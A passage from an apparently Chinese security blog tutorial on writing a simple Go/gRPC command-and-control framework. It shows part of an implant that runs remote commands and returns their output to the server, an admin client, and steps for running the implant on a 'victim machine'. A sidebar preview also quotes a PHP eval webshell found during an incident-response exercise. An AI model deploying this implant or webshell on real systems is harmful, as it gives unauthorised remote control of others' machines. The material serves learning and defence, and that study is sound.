(</span><br><span class="line">	<span class="string">&quot;C2_by_Yliken_in_20250405/grpcapi&quot;</span></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	*************************************************</span><br><span class="line">			c = exec.Command(tokens[<span class="number">0</span>], tokens[<span class="number">1</span>:]...)</span><br><span class="line">		&#125;</span><br><span class="line">		buf, err := c.CombinedOutput()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			cmd.Out = err.Error()</span><br><span class="line">		&#125;</span><br><span class="line">		cmd.Out += <span class="type">string</span>(buf)</span><br><span class="line">		client.SendOutput(ctx, cmd) <span class="comment">//将命令执行结果发送回服务器</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码实现了一个简单的<strong>植入客户端</strong>，它可以：</p>
<ol>
<li>持续与远程 C2 服务器保持连接；</li>
<li>接收远程发送的命令；</li>
<li>在本地执行命令；</li>
<li>将输出结果发送回服务器。</li>
</ol>
<h3 id="📌构建管理组件"><a href="#📌构建管理组件" class="headerlink" title="📌构建管理组件"></a>📌构建管理组件</h3><center>编写client.go</center>

<p>client.go也是管理客户端</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;C2_by_Yliken_in_20250405/grpcapi&quot;</span></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		opts   []grpc.DialOption</span><br><span class="line">		conn   *grpc.ClientConn</span><br><span class="line">		err    <span class="type">error</span></span><br><span class="line">		client grpcapi.AdminClient</span><br><span class="line">	)</span><br><span class="line">	opts = <span class="built_in">append</span>(opts, grpc.WithInsecure())</span><br><span class="line">********************************</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(cmd.Out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为本文只是编写一个最简单的框架。这个client模块也写的很单一。client只能在运行的时候接收一次命令参数。不是交互形式</p>
<h3 id="💻测试"><a href="#💻测试" class="headerlink" title="💻测试"></a>💻测试</h3><p>在您开始测试您的代码之前 请确保您的ip地址以及端口都配置正确</p>
<p>运行<code>server.go</code>文件之后 ，在受害机器上面运行<code>implant.go</code>之后</p>
<p>运行 <code>client.go</code>然后再传入想要执行的命令</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052226553.png" alt="image-20250405222627421"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Yliken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/05/Golang/learn_to_write_a_C2_by_Go/">http://example.com/2025/04/05/Golang/learn_to_write_a_C2_by_Go/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Yliken</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/C2/">C2</a></div><div class="post-share"><div class="social-share" data-image="/img/essayhead/76.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/04/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Principle/" title="hackmyvm-Principle"><img class="cover" src="/img/essayhead/18.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm-Principle</div></div><div class="info-2"><div class="info-item-1"> 近况: 很难受、 也很累。 但是庆幸靶机很好 正值清明时节 清明时节雨纷纷 🌧️，路上行人欲断魂 😢。  靶机地址 信息收集主机发现  端口扫描  80端口仅仅是一个nginx 的欢迎界面而已  robots.txt的内容  hi.html的内容  hackme不存在  investigate的内容  根据提示对这个目录进行目录扫描   12345678910111213According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.Maybe that&#x27;s why I am a...</div></div></div></a><a class="pagination-related" href="/2025/04/20/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" title="玄机"><img class="cover" src="/img/essayhead/42.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">玄机</div></div><div class="info-2"><div class="info-item-1"> 做一做玄机、 学一学应急。 做了几个突然想起。博客开个贴子记录下来也是挺好的😋  第一章 应急响应- Linux入侵排查 web目录存在木马，请找到木马的密码提交  登录上服务器，将web目录打包。下载下来用d盾扫一波  1.php内容  .shell.php内容  index.php内容  index.php作用是在 /var/www/html/下生成.shell.php然后在.shell.php中写入&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt; 这个马的密码是hello  网站目录下面还有一个 shell(1).elf  放进ida里面看了一下，发现自己根本看不懂 就起了一个docker 将它在docker里面执行了一下  然后再看网络连接状态netstat -antlp  连接了10.11.55.21:3333 </div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="artalk-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yliken</div><div class="author-info-description">红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yliken"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Yliken" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:largetlafonu71@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">他说你任何为人称道的美丽  不及他第一次遇到你</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D%E4%BB%80%E4%B9%88%E6%98%AFC2%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">🔍什么是C2？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%ACRAT"><span class="toc-number">1.0.1.</span> <span class="toc-text">远控木马RAT</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D%E4%BB%80%E4%B9%88%E6%98%AFRPC%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">🔍什么是RPC？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D%E4%BB%80%E4%B9%88%E6%98%AFgRPC"><span class="toc-number">2.1.</span> <span class="toc-text">🔍什么是gRPC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF%E4%BB%A3%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">🎯代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C%E5%AE%9A%E4%B9%89%E5%92%8C%E6%9E%84%E5%BB%BAgRPC-API"><span class="toc-number">3.1.</span> <span class="toc-text">📌定义和构建gRPC API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">3.2.</span> <span class="toc-text">📌创建服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.3.</span> <span class="toc-text">📌客户端植入程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C%E6%9E%84%E5%BB%BA%E7%AE%A1%E7%90%86%E7%BB%84%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">📌构建管理组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%BB%E6%B5%8B%E8%AF%95"><span class="toc-number">3.5.</span> <span class="toc-text">💻测试</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/" title="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考"><img src="/img/essayhead/53.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考"/></a><div class="content"><a class="title" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/" title="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考">CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考</a><time datetime="2025-09-08T16:00:00.000Z" title="发表于 2025-09-09 00:00:00">2025-09-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn"><img src="/img/essayhead/34.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Learn Pwn"/></a><div class="content"><a class="title" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn">Learn Pwn</a><time datetime="2025-08-04T16:00:00.000Z" title="发表于 2025-08-05 00:00:00">2025-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto"><img src="/img/essayhead/83.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Motto"/></a><div class="content"><a class="title" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto">mazesec-Motto</a><time datetime="2025-08-02T16:00:00.000Z" title="发表于 2025-08-03 00:00:00">2025-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp"><img src="/img/essayhead/39.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Temp"/></a><div class="content"><a class="title" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp">mazesec-Temp</a><time datetime="2025-07-29T16:00:00.000Z" title="发表于 2025-07-30 00:00:00">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现"><img src="/img/essayhead/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2024-39930复现"/></a><div class="content"><a class="title" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现">CVE-2024-39930复现</a><time datetime="2025-07-27T16:00:00.000Z" title="发表于 2025-07-28 00:00:00">2025-07-28</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Yliken</div><div class="footer_custom_text">层楼终究误少年 自由早晚乱余生</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  let artalkItem = null
  const option = null
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'

  const destroyArtalk = () => {
    if (artalkItem) {
      artalkItem.destroy()
      artalkItem = null
    }
  }

  const artalkChangeMode = theme => artalkItem && artalkItem.setDarkMode(theme === 'dark')

  const initArtalk = (el = document, pageKey = location.pathname) => {
    artalkItem = Artalk.init({
      el: el.querySelector('#artalk-wrap'),
      server: 'https://www.yliken.top/',
      site: 'Yliken 的博客',
      darkMode: document.documentElement.getAttribute('data-theme') === 'dark',
      ...option,
      pageKey: isShuoshuo ? pageKey : (option && option.pageKey) || pageKey
    })

    if (GLOBAL_CONFIG.lightbox === 'null') return
    artalkItem.on('list-loaded', () => {
      artalkItem.ctx.get('list').getCommentNodes().forEach(comment => {
        const $content = comment.getRender().$content
        btf.loadLightbox($content.querySelectorAll('img:not([atk-emoticon])'))
      })
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyArtalk = () => {
        destroyArtalk()
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    btf.addGlobalFn('pjaxSendOnce', destroyArtalk, 'destroyArtalk')
    btf.addGlobalFn('themeChange', artalkChangeMode, 'artalk')
  }

  const loadArtalk = async (el, pageKey) => {
    if (typeof Artalk === 'object') initArtalk(el, pageKey)
    else {
      await btf.getCSS('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.css')
      await btf.getScript('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.js')
      initArtalk(el, pageKey)
    }
  }

  if (isShuoshuo) {
    'Artalk' === 'Artalk'
      ? window.shuoshuoComment = { loadComment: loadArtalk }
      : window.loadOtherComment = loadArtalk
    return
  }

  if ('Artalk' === 'Artalk' || !false) {
    if (false) btf.loadComment(document.getElementById('artalk-wrap'), loadArtalk)
    else setTimeout(loadArtalk, 100)
  } else {
    window.loadOtherComment = loadArtalk
  }
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>